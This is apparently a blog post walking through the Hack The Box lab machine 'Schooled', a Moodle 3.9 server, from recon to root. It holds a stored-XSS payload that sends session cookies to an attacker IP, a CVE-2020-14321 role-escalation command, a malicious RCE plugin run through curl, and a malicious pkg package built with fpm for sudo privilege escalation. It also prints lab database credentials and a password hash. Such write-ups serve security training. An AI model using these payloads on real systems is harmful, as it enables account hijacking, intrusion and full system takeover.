@@ -1,0 +1,137 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[HTB] Schooled | Foguh</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+ document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark')
+ document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: Bender;
+ src: local('Bender'), url("/font/Bender.ttf"), url("/font/Bender.otf");
+}
+@font-face {
+ font-family: BenderLight;
+ src: local('BenderLight'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('/img/bg.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[HTB] Schooled</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-01-07T17:18:49.000Z" id="date"> 2024-01-07</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-01-14T21:05:03.000Z" id="updated"> 2024-01-14</time></div></span></div></div><hr><div id="post-content"><div style="display: flex; justify-content: center; align-items: center;">
+
+  <div style="margin-right: 20px;" class='item-img' data-src='schooled.png'><img src="schooled.png" title="Schooled" width="300px" height="300px" style="pointer-events: none;">
+  </div>
+
+  <div style="display: flex; flex-direction: column; text-align: left;">
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">OS: </strong class='item-img' data-src='freebsd.png'><img src="freebsd.png" alt="FreeBSD" width="20px" height="20px" style="margin-left: 5px;">
+      <span style="margin-left: 5px;">FreeBSD</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Difficulty:</strong>
+      <span>Medium</span>
+    </div>
+    <div style="display: flex; align-items: center; margin-bottom: 10px;">
+      <strong style="margin-right: 5px;">Author:</strong>
+      <span>TheCyberGeek</span>
+    </div>
+    <div style="display: flex; align-items: center;">
+      <strong style="margin-right: 5px;">Release Date:</strong>
+      <span>April 3, 2021</span>
+    </div>
+  </div>
+
+</div>
+
+
+<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ nmap -sC -sV 10.10.10.234 -o nmap_scan<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-07 14:13 WET<br>Nmap scan report <span class="hljs-keyword">for</span> 10.10.10.234<br>Host is up (0.058s latency).<br>Not shown: 998 closed tcp ports (reset)<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.9 (FreeBSD 20200214; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 1d:69:83:78:<span class="hljs-built_in">fc</span>:91:f8:19:c8:75:a7:1e:76:45:05:dc (RSA)<br>|   256 e9:b2:d2:23:9d:cf:0e:63:e0:6d:b9:b1:a6:86:93:38 (ECDSA)<br>|_  256 7f:51:88:f7:3c:<span class="hljs-built_in">dd</span>:77:5e:ba:25:4d:4c:09:25:ea:1f (ED25519)<br>80/tcp open  http    Apache httpd 2.4.46 ((FreeBSD) PHP/<span class="hljs-number">7.4</span>.<span class="hljs-number">15</span>)<br>|_http-title: Schooled - A new kind of educational institute<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">46</span> (FreeBSD) PHP/<span class="hljs-number">7.4</span>.<span class="hljs-number">15</span><br>| http-methods: <br>|_  Potentially risky methods: TRACE<br>Service Info: OS: FreeBSD; CPE: cpe:/o:freebsd:freebsd<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">15.90</span> seconds<br></code></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="center">Port</th>
+<th align="center">Service</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">22</td>
+<td align="center">SSH</td>
+</tr>
+<tr>
+<td align="center">80</td>
+<td align="center">Apache</td>
+</tr>
+</tbody></table>
+<h3 id="http-page"><a href="#http-page" class="headerlink" title="http page"></a>http page</h3><p class='item-img' data-src='/HTB/Schooled/http.png'><img src="/HTB/Schooled/http.png"></p>
+<h3 id="subdomains"><a href="#subdomains" class="headerlink" title="subdomains"></a>subdomains</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ffuf -u http://10.10.10.234 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H <span class="hljs-string">&quot;HOST: FUZZ.schooled.htb&quot;</span> -fs 20750<br><br>        /<span class="hljs-string">&#x27;___\  /&#x27;</span>___\           /<span class="hljs-string">&#x27;___\       </span><br><span class="hljs-string">       /\ \__/ /\ \__/  __  __  /\ \__/       </span><br><span class="hljs-string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      </span><br><span class="hljs-string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      </span><br><span class="hljs-string">         \ \_\   \ \_\  \ \____/  \ \_\       </span><br><span class="hljs-string">          \/_/    \/_/   \/___/    \/_/       </span><br><span class="hljs-string"></span><br><span class="hljs-string">       v2.1.0-dev</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string"> :: Method           : GET</span><br><span class="hljs-string"> :: URL              : http://10.10.10.234</span><br><span class="hljs-string"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt</span><br><span class="hljs-string"> :: Header           : Host: FUZZ.schooled.htb</span><br><span class="hljs-string"> :: Follow redirects : false</span><br><span class="hljs-string"> :: Calibration      : false</span><br><span class="hljs-string"> :: Timeout          : 10</span><br><span class="hljs-string"> :: Threads          : 40</span><br><span class="hljs-string"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span><br><span class="hljs-string"> :: Filter           : Response size: 20750</span><br><span class="hljs-string">________________________________________________</span><br><span class="hljs-string"></span><br><span class="hljs-string">moodle                  [Status: 200, Size: 84, Words: 5, Lines: 2, Duration: 58ms]</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure>
+
+<p>We can see that there is a moodle subdomain.<br>After adding it to our hosts file, we can access it.</p>
+<p class='item-img' data-src='/HTB/Schooled/moodlelogin.png'><img src="/HTB/Schooled/moodlelogin.png"></p>
+<h2 id="Foothold"><a href="#Foothold" class="headerlink" title="Foothold"></a>Foothold</h2><h3 id="Student-Account"><a href="#Student-Account" class="headerlink" title="Student Account"></a>Student Account</h3><p>We can start by creating a student account on the platform.<br>The email needs to end with @student.schooled.htb<br class='item-img' data-src='/HTB/Schooled/studentcreate.png'><img src="/HTB/Schooled/studentcreate.png"></p>
+<p>After creating the account, we can enroll in the Mathematics course.<br class='item-img' data-src='/HTB/Schooled/mathenroll.png'><img src="/HTB/Schooled/mathenroll.png"></p>
+<p>If we look at the announcements, we get a hint regarding the MoodleNet profile<br class='item-img' data-src='/HTB/Schooled/announcement.png'><img src="/HTB/Schooled/announcement.png"></p>
+<h3 id="CVE-2020-25627"><a href="#CVE-2020-25627" class="headerlink" title="CVE-2020-25627"></a>CVE-2020-25627</h3><p>We can head to &#x2F;moodle&#x2F;lib&#x2F;upgrade.txt to see the moodle version being used.<br class='item-img' data-src='/HTB/Schooled/moodleversion.png'><img src="/HTB/Schooled/moodleversion.png"></p>
+<p>After searching for vulnerabilities in version 3.9, we can find <a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2020-25627">CVE-2020-25627</a>, which indicates that there is a stored xss vulnerability in the moodlenetprofile field in the user’s profile page.</p>
+<p>We can test this by editing our profile and trying for an alert.<br class='item-img' data-src='/HTB/Schooled/xssalert1.png'><img src="/HTB/Schooled/xssalert1.png"></p>
+<p>Now if we save the profile, go to our profile page, we will get an alert, meaning the stored xss worked.<br class='item-img' data-src='/HTB/Schooled/xssalert2.png'><img src="/HTB/Schooled/xssalert2.png"></p>
+<h3 id="Teacher-Account"><a href="#Teacher-Account" class="headerlink" title="Teacher Account"></a>Teacher Account</h3><p>We can use this xss vulnerability to send session cookies to our machine.</p>
+<p>Insert the following code in the vulnerable field.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript">&lt;script&gt;<span class="hljs-variable language_">document</span>.<span class="hljs-property">location</span>=<span class="hljs-string">&quot;http://10.10.14.20:8000/?&quot;</span>+<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>Now setup a way to listen to the requests on our machine, I used a python http server in this case.<br>And if you visit your own profile with the listener running, you will receive a request with your session cookie.<br>But if you wait a few minutes, you will get a session cookie from another user.<br class='item-img' data-src='/HTB/Schooled/sessioncookie1.png'><img src="/HTB/Schooled/sessioncookie1.png"></p>
+<p>Now just change your session cookie in your browser<br class='item-img' data-src='/HTB/Schooled/sessioncookie2.png'><img src="/HTB/Schooled/sessioncookie2.png"></p>
+<p>Finally, if you refresh your page, you will now be logged in as another user<br class='item-img' data-src='/HTB/Schooled/teachersession.png'><img src="/HTB/Schooled/teachersession.png"></p>
+<p>This user is a teacher for the Mathematics course<br class='item-img' data-src='/HTB/Schooled/teacher.png'><img src="/HTB/Schooled/teacher.png"></p>
+<h3 id="CVE-2020-14321"><a href="#CVE-2020-14321" class="headerlink" title="CVE-2020-14321"></a>CVE-2020-14321</h3><p>Now since we have a teacher account, this moodle version (3.9), is vulnerable to another exploit (<a target="_blank" rel="noopener" href="https://moodle.org/mod/forum/discuss.php?d=407393">CVE-2020-14321</a>), which allows us to assign the manager role to teachers.</p>
+<p>Using this <a target="_blank" rel="noopener" href="https://github.com/lanzt/CVE-2020-14321">exploit</a> we can easily assign the manager role to a teacher using a session cookie</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 CVE-2020-14321 http://moodle.schooled.htb/moodle --cookie &lt;session cookie&gt;<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Schooled/exploit.png'><img src="/HTB/Schooled/exploit.png"></p>
+<p>If we now refresh our page, we will have access to the site administration page<br class='item-img' data-src='/HTB/Schooled/siteadmin.png'><img src="/HTB/Schooled/siteadmin.png"></p>
+<p>We will now install <a target="_blank" rel="noopener" href="https://github.com/HoangKien1020/Moodle_RCE">this malicious plugin</a> which will allow us to execute code.<br class='item-img' data-src='/HTB/Schooled/plugin1.png'><img src="/HTB/Schooled/plugin1.png"><br class='item-img' data-src='/HTB/Schooled/plugin2.png'><img src="/HTB/Schooled/plugin2.png"></p>
+<p>After installing, we can test rce by running this command</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://moodle.schooled.htb/moodle/blocks/rce/lang/en/block_rce.php?cmd=<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Schooled/rce.png'><img src="/HTB/Schooled/rce.png"></p>
+<p>To get our first shell, we just change the cmd to a revshell (url encoded)<br class='item-img' data-src='/HTB/Schooled/urlencode.png'><img src="/HTB/Schooled/urlencode.png"></p>
+<p>Start a listener and run curl again<br class='item-img' data-src='/HTB/Schooled/curlrevshell.png'><img src="/HTB/Schooled/curlrevshell.png"><br class='item-img' data-src='/HTB/Schooled/shell.png'><img src="/HTB/Schooled/shell.png"></p>
+<h2 id="Lateral-Movement"><a href="#Lateral-Movement" class="headerlink" title="Lateral Movement"></a>Lateral Movement</h2><p>&#x2F;etc&#x2F;passwd<br class='item-img' data-src='/HTB/Schooled/passwd.png'><img src="/HTB/Schooled/passwd.png"></p>
+<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p>We can find credentials for a database in the file &#x2F;usr&#x2F;local&#x2F;www&#x2F;apache24&#x2F;data&#x2F;moodle&#x2F;config.php<br class='item-img' data-src='/HTB/Schooled/dblogin.png'><img src="/HTB/Schooled/dblogin.png"></p>
+<p>We can use this user and password to access the database</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ /usr/local/bin/mysql -u moodle -pPlaybookMaster2020<br>use moodle;<br>show tables;<br></code></pre></td></tr></table></figure>
+
+<p>In the table mdl_user, we have username and password columns<br class='item-img' data-src='/HTB/Schooled/mdl_user.png'><img src="/HTB/Schooled/mdl_user.png"></p>
+<p>The passwords are encrypted<br class='item-img' data-src='/HTB/Schooled/passwords.png'><img src="/HTB/Schooled/passwords.png"></p>
+<p>If we see all details for the user admin, we also see that his name is Jamie, which we know is a user in the machine (from the passwd file)<br class='item-img' data-src='/HTB/Schooled/jamiedb.png'><img src="/HTB/Schooled/jamiedb.png"></p>
+<h3 id="John"><a href="#John" class="headerlink" title="John"></a>John</h3><p>We can use john to decrypt the admin password</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs TEXT">$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Schooled/jamiepassword.png'><img src="/HTB/Schooled/jamiepassword.png"></p>
+<p>Now just ssh as Jamie using this password and get the user flag<br class='item-img' data-src='/HTB/Schooled/userflag.png'><img src="/HTB/Schooled/userflag.png"></p>
+<h2 id="PrivEsc"><a href="#PrivEsc" class="headerlink" title="PrivEsc"></a>PrivEsc</h2><h3 id="fpm"><a href="#fpm" class="headerlink" title="fpm"></a>fpm</h3><p>By running sudo -l, we se that we can install and update packages using pkg as root<br class='item-img' data-src='/HTB/Schooled/sudol.png'><img src="/HTB/Schooled/sudol.png"></p>
+<p>If we search <a target="_blank" rel="noopener" href="https://gtfobins.github.io/gtfobins/pkg/">gtfobins</a> for pkg, we can use it to escalate our privileges, but we need fpm, which the target machine does not have.<br>We will install fpm on our machine and create the malicious package.<br>Then we transfer the package to the target machine and use pkg as root to install it, running the malicious code and getting a root shell.</p>
+<p>On local machine</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gem install fpm<br>$ TF=$(<span class="hljs-built_in">mktemp</span> -d)<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/tmp/root.sh&#x27;</span> &gt; <span class="hljs-variable">$TF</span>/x.sh<br>$ fpm -n x -s <span class="hljs-built_in">dir</span> -t freebsd -a all --before-install <span class="hljs-variable">$TF</span>/x.sh <span class="hljs-variable">$TF</span><br></code></pre></td></tr></table></figure>
+
+<p>If all is done right, we should now have a package called x-1.0.txz<br class='item-img' data-src='/HTB/Schooled/package.png'><img src="/HTB/Schooled/package.png"></p>
+<h3 id="pkg"><a href="#pkg" class="headerlink" title="pkg"></a>pkg</h3><p>Now we need to transfer this file to the target machine<br class='item-img' data-src='/HTB/Schooled/packagecurl.png'><img src="/HTB/Schooled/packagecurl.png"></p>
+<p>This package when installed will run the file &#x2F;tmp&#x2F;root.sh<br>We still have not created this file, so this is what we need to do next.<br class='item-img' data-src='/HTB/Schooled/root.sh.png'><img src="/HTB/Schooled/root.sh.png"></p>
+<p>Don’t forget to make it executable </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ <span class="hljs-built_in">chmod</span> +x /tmp/root.sh<br></code></pre></td></tr></table></figure>
+
+<p>Finally, to get root, start a new listener on the port that you inserted into root.sh and run pkg with sudo</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo pkg install -y --no-repo-update ./x-1.0.txz<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='/HTB/Schooled/pkginstall.png'><img src="/HTB/Schooled/pkginstall.png"></p>
+<p>And we have root<br class='item-img' data-src='/HTB/Schooled/rootflag.png'><img src="/HTB/Schooled/rootflag.png"></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/HTB/Mirai/">← Next [HTB] Mirai</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/HTB/Traceback/">[HTB] Traceback Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="/img/faction/2.png" alt="Logo"></a><h1 id="Dr"><a href="/">Lucas 'Foguh' Ferreira</a></h1><div id="description"><p>Junior PenTester</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Recon"><span class="toc-number">1.</span> <span class="toc-text">Recon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap"><span class="toc-number">1.1.</span> <span class="toc-text">Nmap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-page"><span class="toc-number">1.2.</span> <span class="toc-text">http page</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#subdomains"><span class="toc-number">1.3.</span> <span class="toc-text">subdomains</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Foothold"><span class="toc-number">2.</span> <span class="toc-text">Foothold</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Student-Account"><span class="toc-number">2.1.</span> <span class="toc-text">Student Account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-25627"><span class="toc-number">2.2.</span> <span class="toc-text">CVE-2020-25627</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Teacher-Account"><span class="toc-number">2.3.</span> <span class="toc-text">Teacher Account</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CVE-2020-14321"><span class="toc-number">2.4.</span> <span class="toc-text">CVE-2020-14321</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement"><span class="toc-number">3.</span> <span class="toc-text">Lateral Movement</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql"><span class="toc-number">3.1.</span> <span class="toc-text">mysql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#John"><span class="toc-number">3.2.</span> <span class="toc-text">John</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc"><span class="toc-number">4.</span> <span class="toc-text">PrivEsc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fpm"><span class="toc-number">4.1.</span> <span class="toc-text">fpm</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pkg"><span class="toc-number">4.2.</span> <span class="toc-text">pkg</span></a></li></ol></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
